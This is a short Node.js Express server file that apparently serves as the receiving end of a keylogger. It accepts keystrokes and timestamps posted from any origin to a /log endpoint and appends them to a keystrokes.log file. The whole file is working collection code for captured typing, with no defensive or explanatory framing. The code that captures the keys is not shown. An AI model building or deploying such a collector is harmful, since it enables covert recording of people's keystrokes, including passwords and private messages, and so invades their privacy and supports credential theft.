const express = require("express");
const fs = require("fs");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

app.post("/log", (req, res) => {
  const { key, time } = req.body;
  const entry = `${time} : ${key}\n`;

  fs.appendFileSync("keystrokes.log", entry);
  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
